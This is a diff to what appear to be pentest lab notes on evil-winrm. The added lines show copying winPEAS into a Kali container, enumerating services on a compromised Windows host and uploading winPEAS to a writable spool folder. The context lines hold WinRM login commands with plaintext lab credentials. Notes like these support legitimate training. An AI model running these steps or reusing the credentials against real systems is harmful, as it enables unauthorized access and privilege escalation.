@@ -28,3 +28,35 @@ evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
 sudo docker run --tty --interactive kalilinux/kali-rolling
 evil-winrm -i 172.16.2.5 -u 'DANTE.ADMIN\jbercov' -p mypass123
 ```
+
+* copy files from host into evil-winrm docker container&#x20;
+
+```
+sudo docker cp /opt/winPEASx64.exe 3faed2add6c3:/opt
+```
+
+### evil-winrm Service enumeration
+
+* you can use a builtin from evil-winrm to enumerate services on a remote endpoint
+
+```
+services
+Path                                                                           Privileges Service          
+----                                                                           ---------- -------          
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                           False ADWS             
+C:\Windows\HQbCgOtZ.exe                                                             False fGnb             
+C:\Windows\qiFePsnh.exe                                                             False fYCF             
+C:\Windows\FxRmIulx.exe                                                             False gbkS             
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing
+C:\Windows\rIiHdlwq.exe                                                             False odgx
+--snip-- 
+```
+
+### evil-winrm file upload
+
+* use the builtin for evil-winrm to upload files from your attackbox to the remote host&#x20;
+
+```
+upload /opt/winPEASx64.exe 
+Info: Uploading /opt/winPEASx64.exe to C:\Windows\system32\spool\drivers\color\winPEASx64.exe
+```
